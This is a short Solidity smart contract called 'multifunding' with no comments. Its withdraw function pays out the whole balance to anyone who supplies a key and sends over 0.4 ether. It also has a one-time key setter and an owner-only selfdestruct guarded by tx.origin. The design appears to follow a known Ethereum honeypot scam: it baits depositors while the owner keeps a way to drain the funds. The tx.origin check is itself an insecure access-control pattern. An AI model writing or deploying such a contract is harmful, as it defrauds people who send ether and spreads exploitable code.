pragma solidity ^0.5.11;

contract multifunding
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x2f9b3e20b17f6fb9a29b8253c0137860d08513241549d0f6444bacd9103d3a53;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw(string memory key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }
    
    function setup_key(string memory key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }
    
    function udpate_hash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }
    
    function clear() public
    {
        require(tx.origin == owner);  // Access control check
        selfdestruct(owner);
    }
    
    function get_id() public view returns(bytes32){
        return wallet_id;
    }
    
    function () external payable {
    }
}